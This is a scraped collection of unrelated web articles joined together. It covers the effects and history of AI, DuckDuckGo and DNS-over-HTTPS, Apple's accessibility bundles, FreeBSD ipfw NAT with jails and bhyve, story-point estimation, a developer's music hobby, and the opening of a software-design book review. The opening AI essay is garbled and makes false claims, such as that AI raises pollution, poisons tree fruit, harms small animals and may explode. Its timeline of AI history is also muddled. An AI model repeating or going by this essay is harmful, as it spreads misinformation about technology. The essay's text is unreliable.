<p>By Artificial Intelligence The human work-load decreasing. So the time has been consuming.</p>
<p>People’s having more attractive to new things. So Human is getting much effort behind AI.</p>
<p>It’s more helpful to the patient. Because today have more smart AI machine available for diseased people such as ct scanner, x-ray scanner, etc.</p>

<p>AI’s improving human life to live as easy and changing the environment of the world as beautiful.</p>
<p>Artificial Intelligence is making possible to build new things between us and improving the right to that’s a particular thing.</p>
<p>That’s been also useful in the field up meal or food and procedure of it to happen.</p>
<h3><span id="Negative_Effects_Of_Artificial_Intelligence">Negative Effects Of Artificial Intelligence</span></h3>
<p>Artificial Intelligence may have very dangerous for humans whether the error has been taken it’s maybe exploded.</p>
<p>That’s much harmful to a small or big animal as well as small aunts, dogs, cats, etc.</p>
<p>It’s increasing pollution. So the environment is being harmful to people’s be enough breath.</p>
<div><figure><img src="https://shiv1367.com/wp-content/uploads/2019/05/AI4-300x157.jpg" alt="Disadvantages Of AI" width="735" height="385" srcset="https://shiv1367.com/wp-content/uploads/2019/05/AI4-300x157.jpg 300w, https://shiv1367.com/wp-content/uploads/2019/05/AI4-768x402.jpg 768w, https://shiv1367.com/wp-content/uploads/2019/05/AI4-1024x536.jpg 1024w, https://shiv1367.com/wp-content/uploads/2019/05/AI4-390x205.jpg 390w, https://shiv1367.com/wp-content/uploads/2019/05/AI4.jpg 1200w" sizes="(max-width: 735px) 100vw, 735px" data-srcset="https://shiv1367.com/wp-content/uploads/2019/05/AI4-300x157.jpg 300w, https://shiv1367.com/wp-content/uploads/2019/05/AI4-768x402.jpg 768w, https://shiv1367.com/wp-content/uploads/2019/05/AI4-1024x536.jpg 1024w, https://shiv1367.com/wp-content/uploads/2019/05/AI4-390x205.jpg 390w, https://shiv1367.com/wp-content/uploads/2019/05/AI4.jpg 1200w" data-src="https://shiv1367.com/wp-content/uploads/2019/05/AI4-300x157.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></figure></div>
<p>Sometimes a big machine is more harmful. Because of the exploding of the machine may be very large by many large electrical resources.</p>
<p>It generates much risk to trees. Because poison of atmosphere It’s strict onto the fruit of trees. So human’s having got much trouble to health by that’s un-necessary objectives.</p>
<p>The human’s getting weak by AI. Because of more work done by AI machines.</p>

<p><strong>AI</strong> is important to make easy to all necessary things of humans. So, people having more attractive to the machine is making possible to all the human possibility. see more about the <a href="https://www.eolss.net/Sample-Chapters/C15/E6-44.pdf" rel="nofollow noopener" target="_blank">best definition of artificial intelligence</a>.</p>
<p>Human is putting the whole effort and thought to a machine and encouraging to the machine to make it possible according to own.</p>
<p>Human’s trying the problem to resolved and forwarding the other issue to face out. Therefore they can reach till the goal.</p>
<p>The Intelligence of humans has been important many times by large attempted to solve those issues, Thus the human is having to be more sensible.</p>
<h3><span id="AI_In_Computer_Science"><strong>AI In Computer Science</strong></span></h3>
<p>John McCarthy says AI is the science engineering to making intelligent machines or intelligent&nbsp;<a rel="noreferrer noopener" href="https://shiv1367.com/whatisprogramming" target="_blank"><span>computer programs</span></a>. It is useful for developing a computer, computer-controller, or software.</p>
<p>AI is won by the study of How Human Mind Think, How Human Learning, How Human Make Decision. Then, using study the system or&nbsp;<a rel="noreferrer noopener" href="https://shiv1367.com/whatisprogramming" target="_blank"><span>software</span></a>&nbsp;is starting to development of it.</p>
<h3><span id="Contribution_To_AI"><strong>Contribution To AI</strong></span></h3>

<p><strong>1) Gaming</strong></p>
<p>AI is getting more benefits in such kinds of games like chess, poker, tic-tac-toe, and many others. where The AI machine can make a large number of possibilities by heuristic knowledge.</p>
<p><strong>2) Natural Language Processing</strong></p>
<p>This is the best part of AI to understand the human’s speak language. It’s much tough to develop in&nbsp;<a rel="noreferrer noopener" href="https://shiv1367.com/whatisprogramming" target="_blank"><span>programming</span></a>. But, Today it is possible by human intelligence.</p>
<p><strong>3) Expert Systems</strong></p>
<p>It is good for AI to learn about the system to others. This technique is to advise the user.</p>
<p><strong>4) Vision System</strong></p>
<p>It understands the module like interpretation, comprehends visual user input on the computer or any other device. The vision system is helpful for many ways like spying, finding diagnose for a patient.</p>
<p>It’s very helpful for the police to find the location of criminals and face also.</p>
<p><strong>5) Speech Recognition</strong></p>
<p>The AI system is capable of hearing the human’s voice or language in the term of sentences and meaningful talks to it.</p>
<p>That can measure in different ways like noise in the background, human noise to cold, slang words, etc.</p>
<p><strong>6) Handwriting Recognition</strong></p>
<p>The AI software for handwriting recognization to read and write the different text on paper by a pen or screen. It can find the letter, word, and character.</p>
<p><strong>7) Robots Intelligent</strong></p>
<p>Robots are plays various role by the Artificial Intelligence system. They can detect physical data from real data like lighting, temperature, movement, sound, bump, and pressure.</p>
<p>It has many resources like sensors, effective processer, large storage.</p>
<h4><span id="History_Of_AI"><strong>History Of AI</strong></span></h4>
<p>You can see here about the history of AI from 1923 to 2000 years.</p>
<p><strong>In 1923</strong>, Karel Capek’s named “Rossum’s Universal Robots” (RUR) opened in London, 1923, the first use of the word “robot” in English.</p>
<p><strong>In 1943</strong>, development of neural networks organization.</p>
<p><strong>In 1945</strong>, Isaac Asimov, a Columbia University alumni, coined the term Robotics.</p>
<p><strong>In 1950</strong>, Alan Turing has given an introduction about TuringTest for the evaluation of artificial intelligence and published Computing Machinery. Claude Shannon.</p>
<p>He’s also published a detailed analysis of chess playing as a search.</p>
<p><strong>In 1956</strong>, John McCarthy leads the work of Artificial Intelligence. The first running of the AI program at Carnegie Mellon University in the year of 1958.</p>
<p>John McCarthy explores LISP programming language for Artificial Intelligence.</p>
<p><strong>In 1964</strong>, Danny Bobrow has a dissertation at MIT to declared that computers can think of natural language well and enough to solve algebra word problems correctly.</p>
<p><strong>In 1965</strong>, Joseph Weizenbaum at MIT in 1964 to built ELIZA, an interactive issue that carries on a dialogue in English.</p>
<p><strong>In 1969</strong>, Scientists at Stanford Research Institute built shakey, a robot, equipped with locomotion, perception, and problem-solving.</p>
<p><strong>In 1973</strong>, The Assembly robotics group at Edinburgh University develop Freddy, the famous Scottish robot, capable of using vision to locate and assemble models.</p>
<p><strong>In 1979</strong>, The first computer-controlled autonomous vehicle, Stanford cart, was built.</p>
<p><strong>In 1985</strong>, Harold Cohen created and demonstrated the drawing program, Aaron.</p>
<p><strong>In 1990</strong>, Important serve in all areas of AI:&nbsp;</p>
<p>Significant demonstrations in ML, Case-based reasoning, Multi-agent planning, Scheduling, Data mining, Web Crawler, natural language understanding and translation, Vision, Virtual Reality, Games, etc.</p>
<p><strong>In 1997</strong>, The Deep Blue Chess Program beats the then world chess champion, Garry Kasparov.</p>
<p><strong>In 2000</strong>, Interactive robot pets become commercially available.</p>
<h4><span id="Important_AI_Analytics_ways"><strong>Important AI Analytics ways</strong></span></h4>
<p><strong>Philosophy</strong>&nbsp;– Philosophy is like a logistics approach and reason to analyze the ways like How Human Knows.</p>
<p>That learns critical thinking, close reading, clear writing, and logical analysis. That helps to understand the language we use to describe the world and our place within it.</p>
<p><strong>Mathematics</strong>&nbsp;– It is the science of all Like How Human Think As Long, How Human Do Work As Far. We can say That is the process of counting, …</p></div></div>

<h3><span>What is DuckDuckGo?</span></h3>



<hr>
<p><a href="https://duckduckgo.com/">DuckDuckGo</a> is a search engine similar to Google but, with a major difference – It does not track you! In the modern era of internet where the knowledge acquired by the entire humankind is available at your fingertips, the rise of corporate and government-funded digital-tracking has become a major threat to people’s privacy.</p>
<p>Almost all major search engines including Google, Bing and Yahoo track&nbsp; you. Google most of all!</p>



<h3><span>Why and how much do they track?</span></h3>



<hr>
<p>The reason to why they track is simple – Money! Most companies that provide their product without a cost to thier users earn on the data they collected about them. The data collected about your search history, websites visited, time spent on a website, etc. is used to profile you and categorize your interests and then sold to advertisement companies to make the profit. This is the same business model that social media companies like facebook, twitter, etc. use to make money off of your data.</p>
<blockquote>
<p><strong><em>In a world with companies offering free services, the consumer becomes their product!</em></strong></p>
</blockquote>
<p>Google not only logs your search history from its search engine but also tracks your activities on various websites you visit by paying them to run their scripts on the site’s webpages.</p>



<h3><span>Don’t believe it?</span></h3>



<hr>
<p>I know it might sound like a conspiracy theory but you’d be amazed to know how easy it is to verify these claims. Simply install a plugin like uBlock Origin (<a href="https://addons.mozilla.org/en-US/firefox/addon/ublock-origin">For Firefox</a> or <a href="https://chrome.google.com/webstore/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm?hl=en-US">For Chrome</a>) that lets you see the domains that a website is trying to connect to from your computer and you’ll find that Google’s and Facebook’s trackers are all over the internet.</p>
<p>When you visit a website, the website’s content is downloaded to your device including HTML page, CSS styling and Java Scripts.

<p>The screenshot above is marked with a box that displays that when I visit Standard Chartered’s website, a total of 5 domains get information about my presence on that website. Of these 5 domains, the requests to sc.com and www.sc.com were partially blocked (Red Arrow marked 1), gioip-js.com and googletagmanager.com were completely blocked (Red Arrow Marked 2) and maps.googleapis.com were not at all blocked (Red Arrow Marked 3) by uBlock Origin’s default set of filters. If you’d look a little to the right of that red box, you’d notice that despite 7 requests being blocked in total (13% of all requests on that page), the website was still completely functional and that it did not break.</p>



<h3><span>What’s in it for the government?</span></h3>



<hr>
<p>Frankly, to answer this question is difficult. Sometimes, governments ask these companies to share the data to track their citizens for various reasons. Other times, the governments ask companies like Google to help identify the protestors by disclosing their mobile phone’s GPS location at the time of protests and as a <em>quid pro quo </em>they kill their competition by passing Laws to ban sites like DuckDuckGo. We can never know these answers for sure as these deals are made behind closed doors.</p>



<h3><span>So, what do I do about DuckDuckGo?</span></h3>



<hr>
<p>Well, fortunately the solution to this problem is extremely simple. You can go to the Menu section of Firefox, select Options, go to the “General” settings tab, scroll all the way to the bottom and click the “Settings” button under “Network Settings”.</p>

<p>Besides the two options provided by Firefox, you can also find a list of other HTTPS-enabled privacy-oriented DNS services on <a href="https://www.privacytools.io/providers/dns/">PrivacyTools.io – DNS</a> page.</p>



<h3><span>How Does This Solution Work?</span></h3>



<hr>
<p>To understand how this solution work, we first need to understand how does the DNS work and <a href="https://crackerscreed.org/understanding-ssl-certificates/">how does SSL certificate work</a>. Once you understand that, you’d notice the if your DNS queries are sent over HTTPS, they can only be read by the DNS server and not by your ISP’s firewall. Without reading the your DNS query, they cannot tamper or block its intended response and hence cannot block you from getting its IP address.</p>



<h3><span>Is It A Fool-Proof Solution?</span></h3>



<hr>
<p>The unfortunate answer is No! There are other ways that a government can block a website like IP address based filtering, content based filtering, etc. And even if you bypass these filters and access DuckDuckGo, by no mean you become anonymous over the internet but, switching to an actively-maintained open-sourced browser such as Firefox, installing malware/tracking blocker plugin like uBlock Origin and switching to a privacy-oriented search engine can dramatically reduce your digital footprint. It could be your first step towards a long journey of internet anonymity and digital privacy!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h3>apple doesn’t succeed at making their platforms accessible because they care more, they don’t succeed because they are somehow better at programming</h3>

<p>a capable, thoughtful manager, who is correctly assessing risk vs reward, both qualitatively and quantitatively, who is doing their job well, using all of the experience and skill that brought them to where they are, can, and likely will, decide to ship an app that could be accessible, but is not.</p>

<p>this is not a function of callousness (although they may also be quite callous).</p>

<p>this is not a function of engineering aptitude (plenty of our leading lights have let access fall to the wayside<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> by making solid engineering choices that are completely defensible).</p>

<p>the apple accessibility teams are made up of disciplined, brilliant engineers. they all work incredibly hard on a problem with unimaginable scale. but their brilliance and discipline and hard work, while necessary, are not sufficient.</p>

<p>what matters here, what sets apple apart, is that they figured out how to go last and contain the risk enough to avoid a revolt from other teams or executive leadership. it costs them a lot to do so, has significant, measurable downsides, and requires a significant rethink of what it means to build good software.</p>

<h3>bundles</h3>

<p>some of the code that powers accessibility on apple platforms is just disgusting to look at and to work on.</p>

<p>most of the code that makes apple software accessible lives in what’s called an accessibility bundle. without diving into the minutia of the thing, bundles are a way to load something akin to a plugin into a cocoa app at runtime if an assistive technology is activated. it involves manipulating the app or framework class hierarchy and using objective-c dynamism to read app state and build up a usable accessibility hierarchy. insert a super class here, read an instance variable there, swizzle in a method and store the state for it in associated objects.<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup></p>

<p>bundles are not a good way to build software by any common measure. they don’t make you efficient, or your code correct. the performance can get bad. they’re hard to maintain and involve constant patching to keep them alive. huge chunks of bundle code are thrown away and rewritten multiple times during every major os release.</p>

<p>i found the initial adjustment to working on this code sometimes viscerally upsetting. “i can’t do that!!”, “clearly i should be protecting against…”, “if i do it that way it’ll break when they…”, etc.</p>

<p>the thing is, critically, if a user never activates an assistive technology like voiceover they wouldn’t know bundles even exist. many of the managers at apple don’t know much or care much about accessibility. some of them are borderline hostile to it. the bundles make it possible for the accessibility team to allocate their own resources and set their own priorities with only very limited coordination and fallout contained to people who would benefit most from the upside. they allow the accessibility team to fix the bugs they find, when they find them, with pretty limited opportunities for a manager who’s next promotion is on the line to get cold feet and pull resources or block fixes.</p>

<p>in the model of low end disruption, we can see bundles as a low end entrant, with a product that seems worse, but that solves an important problem in a way that the mature products, by their nature, can’t realistically address.</p>

<p>if the job to be done is “produce easy to understand, correct, maintainable code that engineers who care about those things will enjoy working on” then bundles aren’t even in the competition.</p>

<p>if the job is “manage your team resources responsibly, keep your bug count low, ship your features on time” then bundles aren’t the tool you reach for. why would you load a squirrelly plugin into your own app on purpose?</p>

<p>the chaotic morass of runtime hacks and macros for everything and nearly exclusive dependence on runtime validation<sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup> make them not just not good, but almost aggressively bad. but if the job they are hired to do is make apps that aren’t accessible, they’re incredible. unparalleled. entirely without peer.</p>

<p>almost all the things a good engineer would do to make bundles less gross would make them worse in unacceptable ways. almost anything a high end product might do to accommodate the kind of autonomy bundles demand would make them unacceptable to their current clients.<sup id="fnref:4"><a href="#fn:4" rel="footnote">4</a></sup></p>

<p>apple has a team whose only job is to make things accessible and they have infrastructure that lets that team mostly avoid people who have a different job saying no to them. put those together and you have the most successful accessibility software team (imho) on planet earth.</p>

<h3>the gross stuff isn’t desirable, but is maybe necessary</h3>

<p>anyone who is steeped in universal design that has made it this far has maybe broken out in hives? please just stick with me, it’ll all come out in the wash.</p>

<ul>
<li>well designed apps that take accessibility into consideration from the beginning are better for everyone.</li>
<li>accessible ramps for getting into buildings are better than those terrible lifts they bolt into the sides of stairs in public buildings.</li>
<li>we all benefit from features in society that originate as accessibility affordances, like curb cuts for wheelchairs, that everyone with a stroller can now take for granted.</li>
</ul>


<p>without question these statements are true.</p>

<p>i don’t worry too much about saying things that might make people think i’m a bad engineer or have bad ideas about building software. i do care a lot about not giving people the idea that we should all knock out our accessibility code real quick and sloppy at the end as an afterthought.</p>

<p>my thesis here is that where the effect of failing is very much acute, most of us do not adjust our approach accordingly. likely because we regard assistive technology users as one of many available audiences we may or may not wish to court.</p>

<p>if we ship an app that’s inaccessible, hey we’ll get around to it, we’ve got a roadmap, hasn’t bubbled up yet, software takes time. there are so many bugs in our support tracker and “doesn’t work for blind people” is just a tiny blip.</p>

<p>of course we should be methodical and plan ahead and build our software in a way that is both accessible and maintainable. we should seek to avoid compromising, but should the need to compromise emerge, the balance should unquestionably be tilted towards gross and unmaintainable code where that is the cost of accessibility. if you could fix that missing label but eww i’d have to wire up a very clumsy chain of delegates or fire a notification that clearly violates layering, without question, you should do it.<sup id="fnref:5"><a href="#fn:5" rel="footnote">5</a></sup></p>

<p>we should be willing to find a blend of cultural and political and technical workarounds in our organizations that acknowledge that code can’t be allowed to go out the door that isn’t accessible and that a lot of our ideas about technical excellence and what a good engineering manager does wildly miscalculate the cost of our decisions to “do it right”.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
		<p>Most of the time, I want to do some throw away networking temporally to play
with something or to try something out. I really don't like changing all the
config on a machine just to try something. The FreeBSD documentation leans the
other way first showing you what to edit in rc.conf before maybe mentioning
that actual commands to run. </p>
<p>The ipfw documentation has a different problem. The example in the handbook and
online are both very verbose and very complicated. Because ipfw is normally
configured with a shell script the authors go absolutely wild with all the
features they can.</p>
<p>I had a hard time figuring out ipfw in-kernel NAT from these guides. Instead
here I present the simplest set of commands I could find to set up a NAT and a
little explanation to help you debug when it doesn't work.</p>
<p>This is based on a great email from <a href="https://lists.freebsd.org/pipermail/freebsd-virtualization/2014-October/002998.html">Allan Jude</a> on the
freebsd-virtualization list from 2014 that laid out the basics of this setup. </p>
<h2 id="set-up-overview">Set up Overview</h2>
<p>For testing I want to run virtual machines and vnet jails on my laptop and give
them have access to the internet. I want a throw away NAT setup that is ready
to go quickly.</p>
<p>My laptop connects to my home network (and eventually the internet) over wifi.
The wifi network offers me an address in the 192.168.1.0/24 subnet. On my
laptop I want to have multiple guests. To do this we are going to use ipfw NAT
and a bridge interface. It will look something like this:</p>
<pre><code>         TO INTERNET
          ^
          |
          |
          v
          +-------+  192.168.1.x
+-------------| wlan0 |---------------+
|             +-------+               |
|                 ^                   |
|                 |                   |
|              ipfw nat               |
|                 |                   |
|                 V                   |
|            +---------+              |
| 10.0.4.1   | bridge0 |              |
|            +----+----+              |
|                 ^                   |
|                 | 10.0.4.0/24       |
|      ___________+_______________    |
|      |       |        |        |    |
|      v       v        v        v    |
|  +---+--+ +--+---+ +--+---+ +--+---+|
|  | jail | |  vm  | | jail | | ...  ||
|  +------+ +------+ +------+ +------+|
+-------------- laptop ---------------+
</code></pre><p>The interfaces in the jails (the b half of the epair) and the virtual machines
(the vtnet in the V) won't be visible to ipfw, but will exist in their own
world. To work around this we will use a bridge with the epairs and tap
interfaces.</p>
<h2 id="setting-up-ipfw-nat">Setting up ipfw NAT</h2>
<p>We need to load the kernel modules for ipfw and the ipfw in kernel NAT. ipfw
has the frustrating default (and annoyingly different to ipf and pf) of to
dening all traffic. This default has the great property of locking you out of a
machine you are setting up remotely.</p>
<p>This is control by a sysctl that cannot be changed at run time, but we can
change the default behaviour with kenv before we load the module:</p>
<pre><code># kenv net.inet.ip.fw.default_to_accept=1
</code></pre><p>Now we can safely load ipfw and the in-kernel NAT. </p>
<pre><code># kldload ipfw ipfw_nat
</code></pre><p>ipfw should load enabled, if you are having trouble later on double check that
the firewall is actually enabled.</p>
<pre><code># sysctl net.inet.ip.fw.enable
net.inet.ip.fw.enable: 1
</code></pre><p>When we do NAT we are acting as a gateway between the traffic on the NATd
interface and the real interface. For any packets to be passed we need to
enable forwarding.</p>
<pre><code># sysctl net.inet.ip.forwarding=1
# sysctl net.inet6.ip6.forwarding=1
</code></pre><h2 id="ipfw-rule-set">ipfw rule set</h2>
<p>We need to create an IPFW NAT instance configured with the interface we want to
NAT (wlan0 in this case) and configure rules to pass all traffic from the
bridge through the NAT.</p>
<pre><code># ipfw nat 1 config if wlan0
# ipfw add 101 nat 1 ip from 10.0.4.0/24 to any out via wlan0
# ipfw add 103 nat 1 ip from any to any in via wlan0
</code></pre><p>I like to leave a gap between rules like this so I can insert an ipfw log
command for the eventual case that nothing makes sense and everything is
broken.</p>
<h2 id="set-up-interfaces">set up interfaces</h2>
<p>A bridge is the center of our guest network, we will give it the default root
address that all of our guests will speak to.</p>
<pre><code># ifconfig bridge create
bridge0
# ifconfig bridge0 inet 10.0.4.1/24 up
</code></pre><p>Our jail will use an epair interface to speak to the outside world. They come
as an a and a b part, ifconfig only tells us about the a part when it clones
the interface. When we give a vnet jail an interface it is no longer visible to
the host system. An epair gives us two interfaces that act like a virtual
ethernet cable, we stick one end into the jail and the other is connected to
the bridge.</p>
<pre><code># ifconfig epair create
epair0a
</code></pre><p>Our virtual machine will use a tap interface to access the world. The tap
interface needs to be brought up. There is a helpful sysctl that is off by
default which will trigger the interface to be brought up when it is first
opened. I like to set this to one, otherwise I find myself debugging networking
inside the VM alot with little success.</p>
<pre><code># ifconfig tap create
tap0
# sysctl net.link.tap.up_on_open=1
</code></pre><p>With all the interfaces set up we need to add them to our bridge.</p>
<pre><code># ifconfig bridge0 addm epair0a addm tap0
</code></pre><h2 id="create-jail">Create jail</h2>
<p>Never spoken about is the bsdinstall jail command. It takes a directory and
installs a jail into it. This command will ask you some questions, it would be
cool if it didn't, that would make automating jail creation in scripts much
easier for me.</p>
<pre><code># mkdir testjail
# bsdinstall jail testjail
</code></pre><p>We make our jail persist so it will stick around as we experiment. The
following command creates the jail on the host:</p>
<pre><code># jail -c name=testjail persist vnet path=testjail vnet.interface=epair0b 
</code></pre><p>Now we can jexec into the jail and configure the epair. When you bring one end
of an epair up, the other end comes up, when it goes down the other end goes
down. We just need to configure an address and a default route in our jail.</p>
<pre><code># jexec testjail sh
[testjail] # ifconfig epair0b inet 10.0.4.4/24 up
[testjail] # route add default 10.0.4.1
[testjail] # ping -c 1 10.0.4.1
[testjail] # ping -c 1 192.168.1.1
[testjail] # ping -c 1 8.8.8.8
</code></pre><p>With this setup the jail can speak to our bridge, the local network and the
wider Internet.</p>
<h2 id="create-and-config-a-vm">Create and config a VM</h2>
<p>The FreeBSD offers prebuilt virtual machine images, The latest current one is
available from a url like this:</p>
<pre><code># fetch ftp://ftp.freebsd.org/pub/FreeBSD/snapshots/VM-IMAGES/13.0-CURRENT/amd64/Latest/FreeBSD-13.0-CURRENT-amd64.raw.xz
</code></pre><p>It would be cool if there was a latest symlink that gave you a new head VM from
one static place. The image comes xz compressed, we need to unpack it and I
like to move it to a consistent place:</p>
<pre><code># xz -d FreeBSD-13.0-CURRENT-amd64.raw.xz
# mv FreeBSD-13.0-CURRENT-amd64.raw /vms/freebsd-current
</code></pre><p>bhyve requires we load the vmm kernel module, with that we can use the
excellent vmrun.sh script to launch our vm.</p>
<pre><code># kldload vmm
# sh /usr/share/examples/bhyve/vmrun.sh -c 4 -m 1024 -t tap0 -d /vms/freebsd-current freebsd-current
</code></pre><p>Once that comes up you can log in and do some manual config.</p>
<pre><code>[vm] # ifconfig vtnet0 inet 10.0.4.5/24 up
[vm] # route add default 10.0.4.1
[vm] # ping 8.8.8.8
</code></pre><p>For DNS in both the jail and the virtual machines I have to manually set up the
name server local from my network.</p>
<p>/etc/resolv.conf</p>
<pre><code>search lan
nameserver 192.168.1.1
</code></pre><p>This won't be valid as I move to other networks, but I am sure I will remember
after only a little confusion and debugging.</p>
<h2 id="conclusion">Conclusion</h2>
<p>That is all it takes. The NAT configuration is 3 firewall rules and enabling
forwarding. None of this is persistent and that isn't great practice for a
production environment, but it you just want to experiment with ipfw and NAT,
or spin up a VM for today knowing how to do this in a non-persistent way is
really helpful.</p>

<p>Human beings are not very good at seeing into the future. Unless you have a crystal ball or know how to read tea leaves, trying to predict when an event will happen with any degree of accuracy is very difficult. Unfortunately, as software developers, we are regularly asked to do this. Stakeholders usually want to know when they can expect the completion of features. It can make them nervous if we tell them that we don’t know for sure, or give a timeframe that sounds worryingly large to them to account for our uncertainty.</p>

<p>Story points attempt to solve this by sidestepping time-based estimates, and focusing instead upon estimating complexity - on the basis that we are better at judging how complicated a piece of work is than how long it will take to complete.  Estimating complexity allows us to abstract away things that we can’t reasonably predict (and often throw off our predictions) such as illness and distractions, and focus on the things that we can - like whether one task is going to be bigger than another.</p>

<p>Once we have a way to quantify complexity, it is possible to begin to measure how much of it can be tackled over time - this is known as velocity. Measuring a team’s velocity allows us to build forecasts of how much work they are likely to be able to complete in the future. Note the word <em>likely</em> in that last sentence. Story points are not a silver bullet that will let you make perfect predictions about when a task will be finished - but in my experience, they are a significant step up from trying to estimate time directly.</p>

<p>They help you shift from hand-waving and guessing, to evidence-based reasoning about a teams capacity. Over time I’ve found that the accuracy of story point-based predictions tend to improve as teams gain practice and experience, and as the error in velocity averages away as more data gets added to the calculation.</p>

<p>Story points can be a contentious topic amongst software professionals; a lot have had bad experiences with them, and don’t see how they can ever help on a project. While I don’t think story points will be a good fit for <em>all</em> projects, I do believe that they can be useful on <em>a lot</em> of projects - especially when teams are inexperienced and haven’t had a chance to build up some discipline.</p>

<p>I regularly hear two objections to story points that, in my opinion, betray underlying flaws in peoples thinking rather than a problem with the technique itself:</p>

<p>Firstly: that the complexity of a task is different depending on whether you have more or less experience, often stated as ‘my points are different from your points’. Secondly: that there is ultimately no real difference between complexity and time - ‘five points is about a day, this task will take about a day, so I vote five points’.</p>

<p>The first objection is problematic because you should be estimating for the team, not individuals. If a task is going to be harder for a particular person to complete, then the team should be working with them to help. If you expect someone to struggle to complete work by themselves with no assistance when it would benefit them, then you have more significant problems on your team than estimation. It would be best if you focused on fostering collaboration and knowledge sharing before worrying about anything else.</p>

<p>The second objection is harder to help people move past.  The cognitive leap from time-based estimation, to complexity-based estimation, is quite a large one. The easiest way that I have found to help people get into the right frame of mind is by agreeing on a story to use as a reference at the beginning of estimation sessions. The question then becomes ‘how much larger is the story we are currently estimating than our reference story?’ When they don’t have a lot of experience with relative complexity, people often find ranking stories, and then fitting points to them later much more straightforward than coming up with points on the spot (as you would with planning poker).</p>

<p>With a bit of time and practice, most teams can build up an implicit understanding of how story points relate to the complexity of individual pieces of work in their backlog.  As a team becomes more practised, a satisfying moment eventually occurs: everyone’s estimates begin to converge. You know that your team is getting the hang of things when everyone is consistently voting for the same number of story points on each piece of work that comes up; and when any significant variation that occurs is the result of someone knowing something that the others haven’t considered.</p>

<p>Whether or not you use story points on your project, I think there are some ideas we can learn from them that are universally applicable. Almost all projects benefit when we can quantify changes to them over time. Reflecting upon, and learning from our experiences is a crucial part of agile development, and doing this with data can give us confidence in our conclusions, and justification for our predictions.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p id="794f">As software developers, we are a fairly unique group. For many of us, our profession is also our hobby. On the surface this is great:</p><blockquote><p id="4d9e">“Find a job you enjoy doing, and you will never have to work a day in your life.”</p><p id="8b67">― Mark Twain</p></blockquote><p id="e093">However, in reality, the inspiration for new ideas usually comes up as a side-effect of the things you do in your spare time. Needless to say, that when you program in your spare time as well as your day job, most of your ideas are about “products” aimed at other software developers.</p><p id="1a04">This gave birth to many amazing open-source projects, commercial products, as well as small and large companies built around those products.</p><p id="ff7f">Over my own career I’ve made quite a few products like that: in 2002-2003 I’ve created <a href="https://web.archive.org/web/20070430180014/http://www.spaweditor.com/en/disp.php/en_products/en_spaw/en_spaw_intro" target="_blank" rel="noopener">SPAW Editor</a> so developers can add a WYSIWYG editor to their web apps, in 2011 I started <a href="https://adduplex.com/" target="_blank" rel="noopener">AdDuplex</a> so developers can cross-promote their Windows apps, and in 2018 I made <a href="https://markerjs.com/" target="_blank" rel="noopener">marker.js</a> so developers can implement image annotation. And there were a lot of similar products and projects in-between.</p><p id="cd00">As time passed, though, from-developers-for-developers space got very well saturated. For every noun you can think of there’s a JavasScript library with that name. For every task you want to automate in your development process someone already made a tool. You are often lead (by your own [lack of] imagination) to creating an alternative for something that already exists with only marginal improvement in performance or a slightly nicer API.</p><p id="c2e9">This may be fine for those 10x-alpha-developers, as by iterating on those marginal improvements they move our industry forward. But for us mere mortal developers with impostor syndromes based in reality, the hobbyist part of our dev life got much harder. At least for me personally, coming up with useful ideas for the for-developers projects got infinitely more difficult.</p><h2 id="dceb">Enter out-of-left-field hobby</h2><p id="2b39">Earlier this year I took on an old-new hobby —learning and making music. (Check out my <a href="https://medium.com/renoob" target="_blank" rel="noopener">music-making blog here</a>).

July 1, 2020 | http://www.pathsensitive.com/2018/10/book-review-philosophy-of-software.html | <a href="https://web.archive.org/web/*/http://www.pathsensitive.com/2018/10/book-review-philosophy-of-software.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>

<p>I’m trying to read all the good writing about software design. This is very easy because not very much has been written: it turns out that it’s much easier to write an article about how to write a Tetris AI as a containerized Kotlin microservice than it is to shed insight on how to write good code. And so, when I heard about John Ousterhout’s new book “A Philosophy of Software Design,” I ordered my copy immediately.</p>

<center><img height="200" src="https://images-na.ssl-images-amazon.com/images/I/61iOSX4WNiL._SX404_BO1,204,203,200_.jpg" width="161"></center>

<p>I remember John Ousterhout from Stanford’s grad student visit day as the tall guy who introduced himself with a self-deprecating joke and invited all the Ph. D. admits over to dinner at his house. I know him also as the father of <a href="http://kayousterhout.org/">Kay Ousterhout</a>, whom I recently met as a fellow speaker at Strange Loop, and Amy Ousterhout, whom together are the first pair of sisters to both win the prestigious Hertz Fellowship.</p>

<p>At 170 pages, “A Philosophy of Software Design” (henceforth: PoSD) is a humble book. John’s background is in systems rather than in software engineering or programming languages, and he never claims special expertise. But his practitioner cred is immense. I enjoy tearing apart open-source projects and turning them into case studies of what not to do, so much that my students have requested I write a case study about good code for once. RAMCloud, Ousterhout’s distributed in-memory storage system, is now on my shortlist: from a 5-minute glance, it’s among the cleanest and best-documented code I’ve seen. And, given that he’s a busy professor managing a large lab, he’s written a surprising amount of it himself. He’s had plenty of impact too: he’s the creator of the Tcl language and its Tk framework, which I learned in 2005 as The Way to Write GUIs(™).</p>

<p>PoSD is best read as a tactical guide of how-to’s. About a quarter of it is spent on naming and comments, and much of the rest is about specific patterns. His few attempts to jump from tactical advice to principles are either done by trying to blur together similar-sounding tips, or are hamstrung by his inability to see the meaning of a program beyond the code (more on that later). He demonstrates the lack of principles comically in Chapter 19, where he promises to apply the books’ “principles” to several software trends, and then fills the rest of the chapter with standard (but solid) advice on unit-testing and OOP, with nary a reference to the rest of the book. On the whole, the book’s advice is higher-level than beginner books like Clean Code, but most of its contents will be familiar to a senior software engineer, and the novel parts are hit-and-miss.</p>

